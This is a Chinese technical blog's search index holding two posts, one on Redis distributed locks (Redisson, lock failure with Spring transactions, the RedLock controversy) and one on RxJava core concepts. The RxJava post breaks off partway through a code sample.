<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Redis分布式锁详解</title>
    <link href="/2024/01/11/Redis%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E8%AF%A6%E8%A7%A3/"/>
    <url>/2024/01/11/Redis%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>分布式锁的条件在 “分布式系统操作互斥性与接口幂等性” 一文中有介绍，其中简单提了一下redis的分布式锁实现。后面再学习redis的过程中看到了 Redisson ，在这一块中又包含了大量的知识点，额外写一篇笔记进行记录。</p><h2 id="Redis分布式锁的简单实现"><a href="#Redis分布式锁的简单实现" class="headerlink" title="Redis分布式锁的简单实现"></a>Redis分布式锁的简单实现</h2><p>分布式锁的基本思想是在多个节点之间共享一个锁，以确保在任何给定的时刻只有一个节点能够持有锁。Redis中通常使用SET命令来实现这一点，因为SET是原子操作。</p><h3 id="实现步骤："><a href="#实现步骤：" class="headerlink" title="实现步骤："></a>实现步骤：</h3><ol><li><p><strong>尝试获取锁：</strong> 每个节点在需要获取锁时，通过SET命令尝试往Redis中写入一个特定的键值对，表示锁的持有情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET lock_key unique_value NX PX 30000</span><br></pre></td></tr></table></figure><ul><li><code>lock_key</code>是用于表示锁的键。</li><li><code>unique_value</code>是一个唯一的标识，可以是随机生成的唯一字符串，通常用来标识持有锁的节点。</li><li><code>NX</code>表示只有在<code>lock_key</code>不存在时才能设置成功，确保只有一个节点能够获得锁。</li><li><code>PX 30000</code>表示锁的自动过期时间为30秒，防止节点异常退出时锁一直被占用。</li></ul></li><li><p><strong>检查获取锁的结果：</strong> 根据SET命令的返回值判断是否成功获取锁。</p><ul><li>如果返回<code>OK</code>，表示成功获取锁，执行相应的业务逻辑。</li><li>如果返回<code>null</code>，表示锁已经被其他节点持有，获取锁失败。</li></ul></li><li><p><strong>释放锁：</strong> 在执行完业务逻辑后，节点需要通过DEL命令删除锁的键，释放锁。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEL lock_key</span><br></pre></td></tr></table></figure><p>这样其他节点就有机会获取锁了。</p></li></ol><h3 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h3><ul><li><strong>防止死锁：</strong> 在设置锁的过期时间时，需要确保业务逻辑的执行时间不会超过锁的过期时间，以防止因为业务逻辑执行时间过长而导致锁自动过期被其他节点获取。</li><li><strong>使用唯一标识：</strong> 每个节点在获取锁时，需要使用一个唯一的标识，确保能够正确释放自己持有的锁。</li><li><strong>考虑锁的可重入性：</strong> 根据业务需求，考虑是否支持锁的可重入性，即同一个节点是否可以多次获取同一把锁。</li><li><strong>使用Lua脚本：</strong> 为了确保获取锁和释放锁是原子操作，可以使用Redis的Lua脚本，将获取锁和释放锁的操作封装成一个原子操作。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if redis.call(&#x27;SET&#x27;, KEYS[1], ARGV[1], &#x27;NX&#x27;, &#x27;PX&#x27;, ARGV[2]) then</span><br><span class="line">    return 1</span><br><span class="line">else</span><br><span class="line">    return 0</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>这个脚本接受两个参数，分别是锁的键和唯一标识，返回1表示成功获取锁，0表示获取锁失败。</p><p>使用Redis实现分布式锁时，需要根据具体的业务场景和需求来选择合适的锁的实现方式，并考虑一些潜在的问题，如锁的可重入性、死锁的避免等。</p><h2 id="Redission"><a href="#Redission" class="headerlink" title="Redission"></a>Redission</h2><p>在实际使用时一般会采用Redission，这是一个官方推荐的Redis客户端并实现了很多分布式功能。</p><h3 id="主要特性和组件"><a href="#主要特性和组件" class="headerlink" title="主要特性和组件"></a>主要特性和组件</h3><ol><li><strong>分布式对象：</strong> Redission提供了一系列分布式对象，如分布式AtomicLong、分布式Map、分布式Set等。这些对象可以在分布式环境中共享和操作，使得开发者能够更方便地处理分布式数据。</li><li><strong>分布式集合：</strong> Redission支持一系列分布式集合，包括分布式List、分布式Set、分布式Queue等。这些集合可以在多个节点上同步操作，实现数据共享和同步。</li><li><strong>分布式锁：</strong> Redission提供了基于Redis的分布式锁实现，支持可重入锁和公平锁。它还支持异步执行，以提高性能。</li><li><strong>分布式信号量：</strong> Redission支持分布式信号量，可以用于控制同时访问某个资源的并发数量。</li><li><strong>分布式计数器：</strong> Redission实现了分布式计数器，支持原子性的自增和自减操作。</li><li><strong>分布式发布&#x2F;订阅：</strong> Redission提供了分布式发布&#x2F;订阅的支持，使得不同节点间能够实现消息的发布和订阅。</li><li><strong>分布式任务框架：</strong> Redission提供了分布式任务的支持，包括分布式延时队列和分布式调度器。</li><li><strong>连接池和性能优化：</strong> Redission具有连接池特性，以及一些性能优化的机制，例如在使用集合操作时使用Lua脚本以减少网络开销等。</li><li><strong>Spring支持：</strong> Redission与Spring框架无缝集成，可以通过注解或者Spring Bean来使用。</li><li><strong>基于Netty的异步实现：</strong> Redission使用Netty作为底层通信框架，支持异步IO操作，提高了性能和吞吐量。</li></ol><h3 id="分布式锁失效的场景"><a href="#分布式锁失效的场景" class="headerlink" title="分布式锁失效的场景"></a>分布式锁失效的场景</h3><h4 id="在事务内部使用锁，锁在事务提交前释放"><a href="#在事务内部使用锁，锁在事务提交前释放" class="headerlink" title="在事务内部使用锁，锁在事务提交前释放"></a>在事务内部使用锁，锁在事务提交前释放</h4><p>事务还未提交，锁已经释放，此时其他线程可以获得锁，查询到数据不存在，从而产生重复插入的情况</p><p>为了避免锁在事务提交前释放，我们应该<strong>在事务外层使用锁</strong>，用法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public void createPaymentOrderOuterLock(PaymentOrder paymentOrder) &#123;</span><br><span class="line">    RLock lock = redissonClient.getLock(paymentOrder.getBizNo());</span><br><span class="line">    //采用的redisson可重入锁，提供watchdog机制，在锁释放前默认每10s重置锁失效时间为30s</span><br><span class="line">    lock.lock();</span><br><span class="line">    try &#123;</span><br><span class="line">        applicationContext.getBean(PaymentOrderService.class).createPaymentOrderNoLock(paymentOrder);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        //释放锁</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@Transactional</span><br><span class="line">public void createPaymentOrderNoLock(PaymentOrder paymentOrder) &#123;</span><br><span class="line">    LambdaQueryWrapper&lt;PaymentOrder&gt; paymentOrderLambdaQueryWrapper = new LambdaQueryWrapper&lt;&gt;();</span><br><span class="line">    paymentOrderLambdaQueryWrapper.eq(PaymentOrder::getBizNo,paymentOrder.getBizNo());</span><br><span class="line">    long count = this.count(paymentOrderLambdaQueryWrapper);</span><br><span class="line">    if(count&gt;0)&#123;</span><br><span class="line">        log.info(&quot;不可重复提交付款单&quot;);</span><br><span class="line">        throw new RuntimeException(&quot;不可重复提交付款单&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        this.save(paymentOrder);</span><br><span class="line">        //其他DB操作</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意Spring事务的传播机制</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">* Spring事务传播机制默认为Propagation.REQUIRED，</span><br><span class="line">* createPaymentOrderNoLock的事务会加入到batchCreatePaymentOrder的事务中，</span><br><span class="line">* 此时又会出现锁在事务内部使用，锁提前释放的问题。</span><br><span class="line">**/</span><br><span class="line">@Transactional</span><br><span class="line">public void batchCreatePaymentOrder(List&lt;PaymentOrder&gt; paymentOrderList) &#123;</span><br><span class="line">    for (PaymentOrder paymentOrder : paymentOrderList) &#123;</span><br><span class="line">        paymentOrderService.createPaymentOrderOuterLock(paymentOrder);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Spring事务传播机制默认为Propagation.REQUIRED，createPaymentOrderNoLock的事务会加入到batchCreatePaymentOrder的事务中，此时又会出现锁在事务内部使用，锁提前释放的问题。</p><p><strong>采用声明式注解</strong><br>有时候为了开发方便，我们会采用声明式注解的方式使用锁。<br>下面定义了一个注解DistributeLock</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@Target(ElementType.METHOD)</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">@Documented</span><br><span class="line">public @interface DistributeLock &#123;</span><br><span class="line">    String value() default &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@Slf4j</span><br><span class="line">@Aspect</span><br><span class="line">@Component</span><br><span class="line">//!!!注意此处的优先级设置，如果不设置优先级，和@Transactional一起使用时，会出现锁在事务提交前释放的问题</span><br><span class="line">@Order(PriorityOrdered.HIGHEST_PRECEDENCE)</span><br><span class="line">public class DistributeLockAspect &#123;</span><br><span class="line"> </span><br><span class="line">    @Pointcut(value = &quot;@annotation(com.example.lockfailure.demo.common.aop.annotation.DistributeLock)&quot;)</span><br><span class="line">    public void distributeLockPointCut() &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    @Around(&quot;distributeLockPointCut()&quot;)</span><br><span class="line">    public Object doIdempotent(ProceedingJoinPoint point)&#123;</span><br><span class="line">        //省略非关键代码</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用注解的形式时要注意，如果非要和@Transactional一起使用，注意<strong>设置切面的优先级</strong>，避免锁在事务提交前释放。具体原理可以看下<a href="https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#aop-ataspectj-advice-ordering">spring AOP的拦截器链</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@Transactional</span><br><span class="line">@DistributeLock(value = &quot;#paymentOrder.bizNo&quot;)</span><br><span class="line">public void createPaymentOrderLockAnnotation1(PaymentOrder paymentOrder) &#123;</span><br><span class="line">    LambdaQueryWrapper&lt;PaymentOrder&gt; paymentOrderLambdaQueryWrapper = new LambdaQueryWrapper&lt;&gt;();</span><br><span class="line">    paymentOrderLambdaQueryWrapper.eq(PaymentOrder::getBizNo,paymentOrder.getBizNo());</span><br><span class="line">    long count = this.count(paymentOrderLambdaQueryWrapper);</span><br><span class="line">    if(count&gt;0)&#123;</span><br><span class="line">        log.info(&quot;不可重复提交付款单&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        this.save(paymentOrder);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="业务未执行完-锁超时释放"><a href="#业务未执行完-锁超时释放" class="headerlink" title="业务未执行完 锁超时释放"></a>业务未执行完 锁超时释放</h4><p>该问题是因为在指定的锁的失效时间内（并且没有续命机制），锁内部的业务代码没有执行完，锁超时释放了。<br>尤其是业务链下游，处理的数据量一般都比较大，交互的端比较多，尤其要注意这种情况。<br>下列情形都有可能出现代码没有执行完，锁超时释放的问题</p><ul><li>锁的失效时间设置的太短</li><li>锁的粒度太大，处理链路冗长</li><li>锁内部包含很多耗时操作，比如远程调用、大数据量处理等</li></ul><p><strong>解决方案</strong></p><ul><li>首先会想到，把失效时间设置长一点，确实可以。但设置多长合适呢，设置过长有可能存在拿到锁的客户端宕掉了，此时就要等锁过期才能释放，其他节点处于阻塞状态，降低了系统吞吐。又或者预估了一个失效时间在项目初期没问题，随着数据量增多，或者其他一些不确定因素造成了超时，也会出现问题。</li><li>可以采用类似Redisson的watchdog机制给锁续命。另外，注意减小锁的粒度，把存在并发安全性问题的关键代码锁住即可，增加系统吞吐量。同时也要注意减小事务的粒度，把查询操作、甚至一些远程调用放到事务外部（注意读写分离的情况），避免出现大事务问题。</li></ul><h4 id="Redis节点主从切换"><a href="#Redis节点主从切换" class="headerlink" title="Redis节点主从切换"></a>Redis节点主从切换</h4><p>我们在使用 Redis 时，一般会采用主从集群 + 哨兵的模式部署，这样做的好处在于当主库异常宕机时，哨兵可以实现故障自动切换，把从库提升为主库，继续提供服务，以此保证可用性。<br>当【主从发生切换】时，Redis分布锁会存在安全性问题</p><ol><li>客户端A从master获取到锁</li><li>在master将锁同步到slave之前，master宕掉了。</li><li>slave节点被晋升为master节点</li><li>客户端B取得了同一个资源被客户端A已经获取到的同一个锁。</li></ol><h5 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h5><p>首先要说明一点，出现这种情形的概率是很低的。针对于这种情况，Redis的作者antirez设计出了RedLock算法，然而RedLock算法依赖时钟正确性，存在争议。</p><p><strong>RedLock算法</strong></p><blockquote><p>设置N个相互独立，不存在主从复制或者其他集群协调机制的Redis master节点<br>为了取到锁，客户端应该执行以下操作:</p><ol><li>获取当前Unix时间，以毫秒为单位。</li><li>依次尝试从N个实例，使用相同的key和随机值获取锁。在步骤2，当向Redis设置锁时,客户端应该设置一个网络连接和响应超时时间，这个超时时间应该小于锁的失效时间。<br>例如你的锁自动失效时间为10秒，则超时时间应该在5-50毫秒之间。这样可以避免服务器端Redis已经挂掉的情况下，客户端还在死死地等待响应结果。<br>如果服务器端没有在规定时间内响应，客户端应该尽快尝试另外一个Redis实例。</li><li>客户端使用当前时间减去开始获取锁时间（步骤1记录的时间）就得到获取锁使用的时间。当且仅当从大多数（这里是3个节点）的Redis节点都取到锁，并且使用的时间小于锁失效时间时，锁才算获取成功。</li><li>如果取到了锁，key的真正有效时间等于有效时间减去获取锁所使用的时间（步骤3计算的结果）。</li><li>如果因为某些原因，获取锁失败（没有在至少N&#x2F;2+1个Redis实例取到锁或者取锁时间已经超过了有效时间），客户端应该在所有的Redis实例上进行解锁（即便某些Redis实例根本就没有加锁成功）。</li></ol></blockquote><p><strong>RedLock算法争议</strong></p><p>争议这篇涉及到两个大佬的文章，分别为 Martin Kleppmann 的<a href="https://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html">How to do distributed locking — Martin Kleppmann’s blog</a> 和 antirez的 <a href="http://antirez.com/news/101">Is Redlock safe? - </a></p><p>这两篇文章中双方给出了自己的观点，这里有篇博客对双方观点归纳的很好 <a href="https://juejin.cn/post/7049588479025479717">Is Redlock Safe? 一场关于 Redlock 的辩论 - 掘金 (juejin.cn)</a></p><p>争议点主要在于 Redlock 必须「强依赖」多个节点的时钟是保持同步系统模型的，一旦有节点时钟发生错误，那这个算法模型就失效了。</p><p>这里的同步系统模型是指具有以下属性的系统：</p><ul><li>有界网络延迟（可以保证数据包始终在某个保证的最大值内到达 延迟），</li><li>有界进程暂停（换句话说，硬实时约束，通常只有 在汽车安全气囊系统等中找到）</li><li>有界时钟错误（交叉手指，你没有从<a href="http://xenia.media.mit.edu/~nelson/research/ntp-survey99/">糟糕的 NTP 中获得时间 服务器</a>）。</li></ul><p>请注意，同步模型并不意味着时钟完全同步：它意味着您假设 网络延迟、暂停和时钟漂移的<a href="http://www.net.t-labs.tu-berlin.de/~petr/ADC-07/papers/DLS88.pdf"><em>已知固定上限</em></a>。红锁 假设延迟、暂停和漂移相对于锁的生存时间都很小;如果 计时问题变得与生存时间一样大，算法失败。</p><p>下面是一个RedLock失败的示例：</p><ol><li>客户端 A 获取节点 1、2、3 上的锁。由于网络问题，无法访问 4 和 5。</li><li>节点 3 上的时钟向前跳跃，导致锁到期。</li><li>客户端 B 获取节点 3、4、5 上的锁。由于网络问题，无法访问 1 和 2。</li><li>客户端 A 和 B 现在都相信他们持有锁。</li></ol><p><strong>Redisson弃用RedLock</strong></p><p>起初Redisson也提供的RedLock的实现，但在3.12.5版本后弃用了。</p><p>Redisson 的开发者认为 Redis 的红锁存在争议，但是为了保证可用性，RLock 对象执行的每个 Redis 命令执行都通过 Redis 3.0 中引入的 <a href="http://www.redis.cn/commands/wait.html">WAIT 命令</a>进行同步。</p><p>WAIT 命令会阻塞当前客户端，直到所有以前的写命令都成功的传输并被指定数量的副本确认。如果达到以毫秒为单位指定的超时，则即使尚未达到指定数量的副本，该命令也会返回。<br>WAIT 命令同步复制也并不能保证强一致性，不过在主节点宕机之后，只不过会尽可能的选择最佳的副本（slaves）。</p><p>所以要解决这个问题，如果是想要保证强一致性的话得使用其他成熟的方案，例如zookeeper</p>]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RxJava</title>
    <link href="/2023/12/26/RxJava/"/>
    <url>/2023/12/26/RxJava/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="Reactive-Extensions介绍"><a href="#Reactive-Extensions介绍" class="headerlink" title="Reactive Extensions介绍"></a>Reactive Extensions介绍</h3><p>微软给的定义是，Rx是一个函数库，让开发者可以利用可观察序列和LINQ风格查询操作符来编写异步和基于事件的程序，使用Rx，开发者可以用Observables表示异步数据流，用LINQ操作符查询异步数据流， 用Schedulers参数化异步数据流的并发处理，Rx可以这样定义：Rx &#x3D; Observables + LINQ + Schedulers。</p><p>ReactiveX.io给的定义是，Rx是一个使用可观察数据流进行异步编程的编程接口，ReactiveX结合了观察者模式、迭代器模式和函数式编程的精华。</p><h3 id="RxJava介绍"><a href="#RxJava介绍" class="headerlink" title="RxJava介绍"></a>RxJava介绍</h3><p>RxJava是响应式编程(Reactive Extensions)的java实现，它基于观察者模式的实现了异步编程接口。</p><p>当你单独创建线程去完成任务时，你通常需要管理线程的生命周期、处理线程间通信、避免内存泄漏等问题。这可能涉及到使用 Thread、Executor、Handler 等相关类，以确保任务在适当的线程上执行，同时避免一些常见的多线程编程问题。</p><p>而 RxJava 提供了一种更高级的抽象，使得异步编程更加简洁和易于理解。以下是 RxJava 与单独创建线程的一些区别：</p><ol><li><strong>响应式编程模型：</strong> RxJava 使用观察者模式，通过 Observable 发射数据，然后通过 Observer 订阅并处理这些数据。这种模型更加声明式，你可以定义数据流的操作，而不必明确指定线程的使用。</li><li><strong>链式操作符：</strong> RxJava 提供了丰富的操作符，可以方便地对数据进行变换、过滤、合并等操作。这些操作符可以形成链式调用，使得代码更加清晰和易于理解。</li><li><strong>线程调度：</strong> RxJava 提供了调度器（Schedulers）的概念，可以很容易地切换操作符执行的线程。这使得在不同线程上执行任务变得更加灵活，而无需手动管理线程。</li><li><strong>取消订阅和资源管理：</strong> RxJava 通过 Subscription 提供了取消订阅的机制，从而避免了一些与手动管理线程相关的问题，如内存泄漏。</li><li><strong>错误处理：</strong> RxJava 提供了统一的错误处理机制，可以方便地处理错误，而不用像手动创建线程时那样需要额外的处理。</li></ol><h3 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h3><h4 id="字段含义"><a href="#字段含义" class="headerlink" title="字段含义"></a>字段含义</h4><p><strong>Observable（可观察对象）：</strong> 代表一个可被观察的数据源。它发射一系列的事件，可以是值、错误或者完成通知。</p><p><strong>Observer（观察者）：</strong> 订阅 Observable，接收并处理从 Observable 发射的事件。Observer 的方法包括 <code>onNext</code>（处理发射的值）、<code>onError</code>（处理发射的错误）、<code>onComplete</code>（处理完成通知）。</p><p><strong>Operator（操作符）：</strong> 用于对 Observable 发射的数据序列进行变换和操作。RxJava 提供了许多内置的操作符，如 <code>map</code>、<code>filter</code>、<code>merge</code>、<code>zip</code> 等。</p><p><strong>Schedulers（调度器）：</strong> 用于控制 Observable 的运行在哪个线程上。RxJava 提供了多种调度器，例如 <code>io</code>、<code>computation</code>、<code>newThread</code> 等。</p><p><strong>Subscription（订阅）：</strong> 表示 Observable 和 Observer 之间的订阅关系。当不再需要接收事件时，可以取消订阅以释放资源。</p><p>Reactive 直译为反应性的，有活性的，根据上下文一般翻译为反应式、响应式</p><p>Iterable 可迭代对象，支持以迭代器的形式遍历，许多语言中都存在这个概念</p><p>emit 直译为发射，发布，发出，含义是Observable在数据产生或变化时发送通知给Observer，调用Observer对应的方法，文章里一律译为发射</p><p>items 直译为项目，条目，在Rx里是指Observable发射的数据项，文章里一律译为数据，数据项。</p><h4 id="上-下流"><a href="#上-下流" class="headerlink" title="上&#x2F;下流"></a>上&#x2F;下流</h4><p>在RxJava中，数据以流的方式组织：Rxjava包括一个源数据流，源数据流后跟着若干个用于消费数据流的步骤。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">source</span><br><span class="line">  .operator1()</span><br><span class="line">  .operator2()</span><br><span class="line">  .operator3()</span><br><span class="line">  .subscribe(consumer)</span><br></pre></td></tr></table></figure><p>在代码中，对于operator2来说，在它前面叫做上流，在它后面的叫做下流。</p><p>流对象</p><p>在RxJava的文档中，emission, emits, item, event, signal, data and message都被认为在数据流中被传递的数据对象。</p><h4 id="背压-Backpressure"><a href="#背压-Backpressure" class="headerlink" title="背压(Backpressure)"></a>背压(Backpressure)</h4><p>当上下游在不同的线程中，通过Observable发射，处理，响应数据流时，如果上游发射数据的速度快于下游接收处理数据的速度，这样对于那些没来得及处理的数据就会造成积压，这些数据既不会丢失，也不会被垃圾回收机制回收，而是存放在一个异步缓存池中，如果缓存池中的数据一直得不到处理，越积越多，最后就会造成内存溢出，这便是响应式编程中的背压（backpressure）问题。</p><p>为此，RxJava带来了backpressure的概念。背压是一种流量的控制步骤，在不知道上流还有多少数据的情形下控制内存的使用，表示它们还能处理多少数据。<strong>背压是指在异步场景中，被观察者发送事件速度远快于观察者的处理速度的情况下，一种告诉上游的被观察者降低发送速度的策略。</strong></p><p>在Rxjava1.0中，有的Observable支持背压，有的不支持，为了解决这种问题，2.0把支持背压和不支持背压的Observable区分开来：支持背压的有Flowable类，不支持背压的有Observable，Single, Maybe and Completable类。</p><ol><li>在订阅的时候如果使用FlowableSubscriber，那么需要通过s.request(Long.MAX_VALUE)去主动请求上游的数据项。如果遇到背压报错的时候，FlowableSubscriber默认已经将错误try-catch，并通过onError()进行回调，程序并不会崩溃；</li><li>在订阅的时候如果使用Consumer，那么不需要主动去请求上游数据，默认已经调用了s.request(Long.MAX_VALUE)。如果遇到背压报错、且对Throwable的Consumer没有new出来，则程序直接崩溃；</li><li>背压策略的上游的默认缓存池是128。</li></ol><p>背压策略：</p><ol><li>error， 缓冲区大概在128</li><li>buffer， 缓冲区在1000左右</li><li>drop， 把存不下的事件丢弃</li><li>latest， 只保留最新的</li><li>missing, 缺省设置，不做任何操作</li></ol><h4 id="线程调度器（Schedulers）"><a href="#线程调度器（Schedulers）" class="headerlink" title="线程调度器（Schedulers）"></a>线程调度器（Schedulers）</h4><p>对于Android开发者而言，RxJava最简单的是通过调度器来方便地切换线程。在不同平台还有不同的调度器，例如我们Android的主线程：AndroidSchedulers.mainThread()。</p><table><thead><tr><th>调度器</th><th>功能</th></tr></thead><tbody><tr><td>AndroidSchedulers.mainThread()</td><td>需要引用rxandroid, 切换到UI线程</td></tr><tr><td>Schedulers.computation()</td><td>用于计算任务，如事件循环和回调处理，默认线程数等于处理器数量</td></tr><tr><td>Schedulers.io()</td><td>用于IO密集型任务，如异步阻塞IO操作，这个调度器的线程池会根据需求，它默认是一个CacheThreadScheduler</td></tr><tr><td>Schedulers.newThread()</td><td>为每一个任务创建一个新线程</td></tr><tr><td>Schedulers.trampoline()</td><td>在当前线程中立刻执行，如当前线程中有任务在执行则将其暂停， 等插入进来的任务执行完成之后，在将未完成的任务继续完成。</td></tr><tr><td>Scheduler.from(executor)</td><td>指定Executor作为调度器</td></tr></tbody></table><h4 id="事件调度器"><a href="#事件调度器" class="headerlink" title="事件调度器"></a>事件调度器</h4><p>RxJava事件发出去并不是置之不顾，要有合理的管理者来管理它们，在合适的时机要进行释放事件，这样才不会导致内存泄漏，这里的管理者我们称为事件调度器(或事件管理者)CompositeDisposable。</p><h4 id="基类"><a href="#基类" class="headerlink" title="基类"></a>基类</h4><p>RxJava 3 中的基类相比RxJava 2 没啥改变，主要有以下几个基类：</p><ul><li>io.reactivex.Flowable：发送0个N个的数据，支持Reactive-Streams和背压</li><li>io.reactivex.Observable：发送0个N个的数据，不支持背压，</li><li>io.reactivex.Single：只能发送单个数据或者一个错误</li><li>io.reactivex.Completable：没有发送任何数据，但只处理 onComplete 和 onError 事件。</li><li>io.reactivex.Maybe：能够发射0或者1个数据，要么成功，要么失败。</li></ul><h4 id="Observables的”热”和”冷”"><a href="#Observables的”热”和”冷”" class="headerlink" title="Observables的”热”和”冷”"></a>Observables的”热”和”冷”</h4><p>​    Observable什么时候开始发射数据序列？这取决于Observable的实现，一个”热”的Observable可能一创建完就开始发射数据，因此所有后续订阅它的观察者可能从序列中间的某个位置开始接受数据（有一些数据错过了）。一个”冷”的Observable会一直等待，直到有观察者订阅它才开始发射数据，因此这个观察者可以确保会收到整个数据序列。</p><p>在一些ReactiveX实现里，还存在一种被称作Connectable的Observable，不管有没有观察者订阅它，这种Observable都不会开始发射数据，除非Connect方法被调用。</p><h2 id="RxJava简单使用"><a href="#RxJava简单使用" class="headerlink" title="RxJava简单使用"></a>RxJava简单使用</h2><p>RxJava以观察者模式为骨架，有两种常见的观察者模式：</p><ul><li>Observable(被观察者)&#x2F;Observer（观察者）</li><li>Flowable(被观察者)&#x2F;Subscriber(观察者)</li></ul><h3 id="Observable-Observer"><a href="#Observable-Observer" class="headerlink" title="Observable&#x2F;Observer"></a>Observable&#x2F;Observer</h3><p>Observable正常用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Observable mObservable=Observable.create(new ObservableOnSubscribe&lt;Integer&gt;() &#123;</span><br><span class="line">       @Override</span><br><span class="line">       public void subscribe(ObservableEmitter&lt;Integer&gt; e) throws Exception &#123;</span><br><span class="line">           e.onNext(1);</span><br><span class="line">           e.onNext(2);</span><br><span class="line">           e.onComplete();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;);</span><br><span class="line"></span><br><span class="line">   Observer mObserver=new Observer&lt;Integer&gt;() &#123;</span><br><span class="line">       //这是新加入的方法，在订阅后发送数据之前，</span><br><span class="line">       //回首先调用这个方法，而Disposable可用于取消订阅</span><br><span class="line">       @Override</span><br><span class="line">       public void onSubscribe(Disposable d) &#123;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       @Override</span><br><span class="line">       public void onNext(Integer value) &#123;</span><br><span class="line">           Log.e(&quot;lucas&quot;, &quot;onNext: &quot;+value );</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       @Override</span><br><span class="line">       public void onError(Throwable e) &#123;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       @Override</span><br><span class="line">       public void onComplete() &#123;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   